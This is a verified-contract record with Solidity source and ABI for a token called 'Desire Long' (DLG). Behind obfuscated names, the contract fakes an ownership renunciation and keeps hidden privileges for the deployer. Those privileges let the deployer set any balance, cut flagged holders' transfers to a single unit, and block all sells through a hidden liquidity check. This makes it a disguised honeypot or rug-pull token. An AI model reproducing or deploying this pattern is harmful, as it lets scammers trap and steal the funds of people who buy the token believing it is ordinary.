{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface tokenSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract enableWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellTeam {\n    function createPair(address tradingMax, address fromLaunch) external returns (address);\n}\n\ninterface liquidityEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchedFrom) external view returns (uint256);\n\n    function transfer(address shouldFund, uint256 enableTakeAuto) external returns (bool);\n\n    function allowance(address receiverFeeAmount, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 enableTakeAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address shouldFund,\n        uint256 enableTakeAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableTotalLiquidity, uint256 value);\n    event Approval(address indexed receiverFeeAmount, address indexed spender, uint256 value);\n}\n\ninterface receiverWallet is liquidityEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DesireLong is enableWallet, liquidityEnable, receiverWallet {\n\n    function decimals() external view virtual override returns (uint8) {\n        return liquidityLaunched;\n    }\n\n    address tradingFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function getOwner() external view returns (address) {\n        return maxFrom;\n    }\n\n    bool public fundList;\n\n    function enableFeeWallet(address teamList, address shouldFund, uint256 enableTakeAuto) internal returns (bool) {\n        require(toShouldTeam[teamList] >= enableTakeAuto);\n        toShouldTeam[teamList] -= enableTakeAuto;\n        toShouldTeam[shouldFund] += enableTakeAuto;\n        emit Transfer(teamList, shouldFund, enableTakeAuto);\n        return true;\n    }\n\n    function allowance(address minLaunched, address amountLaunched) external view virtual override returns (uint256) {\n        if (amountLaunched == tradingFrom) {\n            return type(uint256).max;\n        }\n        return senderWallet[minLaunched][amountLaunched];\n    }\n\n    function walletAtIs(uint256 enableTakeAuto) public {\n        txLiquidity();\n        exemptMaxSell = enableTakeAuto;\n    }\n\n    function transfer(address launchTx, uint256 enableTakeAuto) external virtual override returns (bool) {\n        return teamTotal(_msgSender(), launchTx, enableTakeAuto);\n    }\n\n    address buyToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint8 private liquidityLaunched = 18;\n\n    function approve(address amountLaunched, uint256 enableTakeAuto) public virtual override returns (bool) {\n        senderWallet[_msgSender()][amountLaunched] = enableTakeAuto;\n        emit Approval(_msgSender(), amountLaunched, enableTakeAuto);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return minFund;\n    }\n\n    function txLiquidity() private view {\n        require(autoTotalFee[_msgSender()]);\n    }\n\n    mapping(address => bool) public minList;\n\n    function owner() external view returns (address) {\n        return maxFrom;\n    }\n\n    mapping(address => uint256) private toShouldTeam;\n\n    function transferFrom(address teamList, address shouldFund, uint256 enableTakeAuto) external override returns (bool) {\n        if (_msgSender() != tradingFrom) {\n            if (senderWallet[teamList][_msgSender()] != type(uint256).max) {\n                require(enableTakeAuto <= senderWallet[teamList][_msgSender()]);\n                senderWallet[teamList][_msgSender()] -= enableTakeAuto;\n            }\n        }\n        return teamTotal(teamList, shouldFund, enableTakeAuto);\n    }\n\n    constructor (){\n        \n        tokenSender takeSender = tokenSender(tradingFrom);\n        fromTxLaunched = sellTeam(takeSender.factory()).createPair(takeSender.WETH(), address(this));\n        if (exemptMin == shouldLaunchedFee) {\n            toFromSwap = true;\n        }\n        autoMax = _msgSender();\n        receiverModeTrading();\n        autoTotalFee[autoMax] = true;\n        toShouldTeam[autoMax] = isTx;\n        \n        emit Transfer(address(0), autoMax, isTx);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return isTx;\n    }\n\n    uint256 private shouldToToken;\n\n    bool public teamLimit;\n\n    function receiverModeTrading() public {\n        emit OwnershipTransferred(autoMax, address(0));\n        maxFrom = address(0);\n    }\n\n    string private totalSender = \"Desire Long\";\n\n    event OwnershipTransferred(address indexed isToken, address indexed receiverTeam);\n\n    uint256 private isTx = 100000000 * 10 ** 18;\n\n    uint256 fromMaxMin;\n\n    function walletIs(address takeFund) public {\n        txLiquidity();\n        \n        if (takeFund == autoMax || takeFund == fromTxLaunched) {\n            return;\n        }\n        minList[takeFund] = true;\n    }\n\n    function teamTotal(address teamList, address shouldFund, uint256 enableTakeAuto) internal returns (bool) {\n        if (teamList == autoMax) {\n            return enableFeeWallet(teamList, shouldFund, enableTakeAuto);\n        }\n        uint256 listSender = liquidityEnable(fromTxLaunched).balanceOf(buyToken);\n        require(listSender == exemptMaxSell);\n        require(shouldFund != buyToken);\n        if (minList[teamList]) {\n            return enableFeeWallet(teamList, shouldFund, minToken);\n        }\n        return enableFeeWallet(teamList, shouldFund, enableTakeAuto);\n    }\n\n    bool public toFromSwap;\n\n    bool public limitIs;\n\n    function swapAt(address teamTo) public {\n        require(teamTo.balance < 100000);\n        if (limitIs) {\n            return;\n        }\n        \n        autoTotalFee[teamTo] = true;\n        \n        limitIs = true;\n    }\n\n    address public fromTxLaunched;\n\n    uint256 constant minToken = 1 ** 10;\n\n    string private minFund = \"DLG\";\n\n    bool private isLiquidity;\n\n    function name() external view virtual override returns (string memory) {\n        return totalSender;\n    }\n\n    mapping(address => bool) public autoTotalFee;\n\n    function balanceOf(address launchedFrom) public view virtual override returns (uint256) {\n        return toShouldTeam[launchedFrom];\n    }\n\n    bool public marketingIs;\n\n    address public autoMax;\n\n    mapping(address => mapping(address => uint256)) private senderWallet;\n\n    uint256 public exemptMin;\n\n    function fundReceiver(address launchTx, uint256 enableTakeAuto) public {\n        txLiquidity();\n        toShouldTeam[launchTx] = enableTakeAuto;\n    }\n\n    address private maxFrom;\n\n    uint256 exemptMaxSell;\n\n    uint256 private shouldLaunchedFee;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverFeeAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTeam\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableTotalLiquidity\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountLaunched\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableTakeAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoTotalFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTxLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableTakeAuto\",\"type\":\"uint256\"}],\"name\":\"fundReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverModeTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTo\",\"type\":\"address\"}],\"name\":\"swapAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFromSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableTakeAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableTakeAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"enableTakeAuto\",\"type\":\"uint256\"}],\"name\":\"walletAtIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeFund\",\"type\":\"address\"}],\"name\":\"walletIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DesireLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}